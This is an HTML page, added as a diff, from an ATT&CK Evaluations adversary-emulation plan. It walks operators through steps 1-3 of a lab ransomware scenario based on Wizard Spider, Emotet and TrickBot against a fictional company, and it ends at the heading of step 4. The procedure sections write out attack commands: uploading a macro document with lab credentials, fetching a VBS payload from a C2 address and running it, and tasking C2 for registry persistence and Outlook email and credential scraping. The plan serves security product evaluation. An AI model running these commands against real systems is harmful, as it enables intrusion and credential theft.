@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.771964962339">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Scenario Overview (Protections)</title>
+    <meta name="title" content="Scenario Overview (Protections)">
+    <meta name="description" content="This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/wizard_spider/emulation_plan/scenario_2/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/wizard_spider/emulation_plan/scenario_2/">
+    <meta property="og:title" content="Scenario Overview (Protections)">
+    <meta property="og:description" content="This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/wizard_spider/emulation_plan/scenario_2/">
+    <meta property="twitter:title" content="Scenario Overview (Protections)">
+    <meta property="twitter:description" content="This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.5.0.771964962339" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.771964962339" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.771964962339" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library Overview
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/wizard_spider/" class="pr-4">
+                                                Wizard Spider
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Emulation Plan
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/wizard_spider/emulation_plan/scenario_2/" class="pr-4">
+                                                Scenario Overview (Protections)
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="scenario-overview-protections" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-overview-protections">#</doc-anchor-trigger>
+        <span>Scenario Overview (Protections)</span>
+    </h1>
+</doc-anchor-target>
+<p>This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).</p>
+<p>This scenario emulates Wizard Spider TTPs based on  several malware specimens either used by or associated with the Wizard Spider actors:</p>
+<ol>
+<li>Emotet</li>
+<li>Trickbot</li>
+<li>Ryuk</li>
+</ol>
+<p>The steps in this scenario are grouped to support Protections Evaluations.</p>
+<p><figure class="content-center">
+    <img src="../../resources/images/wizard20spider20protections20diagram.drawio-2.png" alt="Wizard Spider Protections Diagram">
+    <figcaption class="caption">Wizard Spider Protections Diagram</figcaption>
+</figure>
+</p>
+<hr>
+<doc-anchor-target id="test-1-steps-1-3">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-1-steps-1-3">#</doc-anchor-trigger>
+        <span>Test 1 (steps 1-3)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-1---initial-compromise">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-compromise">#</doc-anchor-trigger>
+        <span>Step 1 - Initial Compromise</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.</p>
+<p>The word document contains <a href="../../resources/emotet_dropper/">obfuscated VBA macros</a> that downloads and executes a malicious DLL.</p>
+<p>The <a href="../../resources/emotet/">malicious DLL</a> establishes a C2 session with the adversary control server.</p>
+<p>The malicious DLL is based on Emotet.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Compromised user info:
+
+User:	judy@oz.local
+
+System: 10.0.0.7 / dorothy
+
+C2:	192.168.0.4:80 HTTP; traffic is AES-encrypted with symmetric key and base64 encoded</code></pre>
+</doc-codeblock></div>
+<p><em>Note: the document is pre-positioned in the environment.</em></p>
+<p><em>We do not emulate sending the document to target, as our focus is evaluating their product against post-initial-access TTPs.</em></p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<p>Upload the Emotet-dropper document to Dorothy&#x27;s desktop:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">smbclient -U 'oz\judy' //10.0.0.7/C$ -c &quot;put wizard_spider/Resources/Emotet_Dropper/ChristmasCard.docm Users/judy/Desktop\ChristmasCard.docm;&quot; &quot;Passw0rd!&quot;</code></pre>
+</doc-codeblock></div>
+<p>Start the control server from your terminator terminal.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd ~/wizard_spider/Resources/control_server
+sudo ./controlServer</code></pre>
+</doc-codeblock></div>
+<p>Open a new terminal tab (ctrl-shift-T); double click the terminal tab and rename it to &quot;RDP to Dorothy&quot;</p>
+<p>RDP into Dorothy / 10.0.0.7 as user Judy:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">xfreerdp +clipboard /u:oz\\judy /p:&quot;Passw0rd!&quot; /v:10.0.0.7</code></pre>
+</doc-codeblock></div>
+<ol>
+<li><p>Open outlook if its not already open, log in to Office account if not already logged in</p>
+</li>
+<li><p>Open the ChristmasCard.docm document on the desktop; enable macros when prompted.</p>
+</li>
+<li><p>You should see a terminal flash; wait for it to execute the Emotet DLL.</p>
+</li>
+<li><p>Go back to your control server tab; you should have a new callback.</p>
+</li>
+<li><p>Take a screenshot of your new session, and paste in the vendor slack channel.</p>
+</li>
+</ol>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. [6][13][2][8][12]</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet_dropper/">Source Code - Dropper Word Document</a></p>
+<p><a href="../../resources/emotet/">Source Code - Emotet DLL</a></p>
+<br>
+<p><code v-pre>For testing without MS Office; be aware that this is not identical to the Word document implementation - the process lineage and file paths change significantly with this method.</code></p>
+<p>Open PowerShell and run:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile $env:AppData\adb.vbs</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has used HTTP for network communications.[5]
+
+cscript.exe $env:AppData\adb.vbs</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf">https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf</a></p>
+</li>
+<li><p><a href="https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor">https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor</a></p>
+</li>
+<li><p><a href="https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html">https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html</a></p>
+</li>
+<li><p><a href="https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/">https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/</a></p>
+</li>
+<li><p><a href="https://blog.talosintelligence.com/2019/01/return-of-emotet.html">https://blog.talosintelligence.com/2019/01/return-of-emotet.html</a></p>
+</li>
+</ul>
+<doc-anchor-target id="step-2---emotet-persistence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---emotet-persistence">#</doc-anchor-trigger>
+        <span>Step 2 - Emotet Persistence</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>Wizard Spider establishes registry persistence by adding the registry key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Path: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+Key: blbdigital
+
+Value: rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL</code></pre>
+</doc-codeblock></div>
+<p>The registry key is written using the <code v-pre>RegSetValueExA</code> WinAPI function.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<p>Open a horizontal terminal tab (right-click split horizontally).</p>
+<p>Copy/paste the command in your lower terminal tab:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Emotet has been observed adding the downloaded payload to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run key to maintain persistence.[6][7][8]
+
+# Wizard Spider has established persistence via the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and a shortcut within the startup folder.[2][3]
+
+./evalsC2client.py --set-task DOROTHY_DABB41A5 1</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/emotetclientdll/emotetclientdll/persistence.cpp#L21">Source Code</a></p>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/">https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/</a></p>
+</li>
+<li><p><a href="https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor">https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor</a></p>
+</li>
+<li><p><a href="https://www.us-cert.gov/ncas/alerts/TA18-201A">https://www.us-cert.gov/ncas/alerts/TA18-201A</a></p>
+</li>
+<li><p><a href="https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html">https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html</a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-3---emotet-host-discovery-and-credential-collection">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---emotet-host-discovery-and-credential-collection">#</doc-anchor-trigger>
+        <span>Step 3 - Emotet Host Discovery and Credential Collection</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>Wizard Spider first enumerates local processes using WinAPI functions: <code v-pre>CreateToolhelp32Snapshot</code> and <code v-pre>Process32First</code>.</p>
+<p>Wizard Spider then downloads and loads an Outlook scraper DLL using the <code v-pre>LoadLibraryW</code> and <code v-pre>GetProcAddress</code> functions.</p>
+<p>Lastly, Wizard Spider executes the Outlook-scraper to dump emails and contacts.</p>
+<p>One of the emails contains credentials for another user, <a href="mailto:bill@oz.local">bill@oz.local</a>, which will be used in the next step.</p>
+<p>Download Info:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">URL (HTTP GET): http://192.168.0.4:80/modules
+
+Download occurs over HTTP. All traffic is AES encrypted and base64 encoded in transit.
+
+File Write:     C:\Windows\SysWOW64\Outlook.dll</code></pre>
+</doc-codeblock></div>
+<hr>
+<doc-anchor-target id="procedures">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<p>Enumerate processes.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Emotet has been observed enumerating local processes.[17]
+
+./evalsC2client.py --set-task DOROTHY_DABB41A5 2</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/emotetclientdll/emotetclientdll/hostdiscovery.cpp#L172">Source Code</a></p>
+<p>Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current working directory.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task DOROTHY_DABB41A5 3</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/emotetclientdll/emotetclientdll/comms.cpp#L114">Source Code</a></p>
+<p>Load Outlook Scraper DLL into emotet&#x27;s address space via call to LoadLibraryW() and GetProcAddress().</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task DOROTHY_DABB41A5 4</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/emotetclientdll/emotetclientdll/loadoutlookscraper.cpp#L16">Source Code</a></p>
+<p>Scrape email content from Outlook inbox via _popen call to PowerShell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Emotet has been observed leveraging a module that scrapes email data from Outlook.[3]
+
+# Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. [7][3]
+
+./evalsC2client.py --set-task DOROTHY_DABB41A5 5</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/outlookscraper/outlookscraper/outlook.cpp#L64">Source Code</a></p>
+<p><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-160" class="outbound" target="_blank"><span>_popen info, because I&#x27;ve never heard of it either</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+<p>Scrape email addresses from inbox.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Emotet has been observed leveraging a module that can scrape email addresses from Outlook.[3][4]
+
+./evalsC2client.py --set-task DOROTHY_DABB41A5 8</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/emotet/emotetclientdll/emotetclientdll/comms.cpp#L99">Source Code</a></p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Sign out of RDP session: <code v-pre>Right-click Windows icon -&gt; Shut down or sign out -&gt; Sign out</code></p>
+<br>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://unit42.paloaltonetworks.com/emotet-command-and-control/">https://unit42.paloaltonetworks.com/emotet-command-and-control/</a></p>
+</li>
+<li><p><a href="https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/">https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/</a></p>
+</li>
+<li><p><a href="https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/">https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/</a></p>
+</li>
+<li><p><a href="https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf">https://global.ahnlab.com/global/upload/download/asecreport/ASEC%20REPORT_vol.88_ENG.pdf</a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="test-2-steps-4-6">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-2-steps-4-6">#</doc-anchor-trigger>
+        <span>Test 2 (Steps 4-6)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-4---move-laterally-deploy-trickbot">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-4---move-laterally-deploy-trickbot">#</doc-anchor-trigger>
+        <span>Step 4 - Move Laterally Deploy TrickBot</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>During this step, Wizard Spider uses bill&#x27;s credentials to RDP into Toto.</p>
+<p>Wizard Spider uploads and executes a malicious EXE based on TrickBot.</p>
+<p>Trickbot is uploaded to target using an RDP-mounted network share.</p>
+<p>Once executed, Trickbot calls back to the C2 server over HTTP.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Compromised user info:
+
+User:	bill@oz.local
+
+System: 10.0.0.8 / toto
+
+File Write (Tribot EXE): %AppData%\uxtheme.exe
+
+C2:	192.168.0.4:447 HTTP - no encryption or obfuscation</code></pre>
+</doc-codeblock></div>
+<hr>
+<doc-anchor-target id="procedures">
+    <h4>
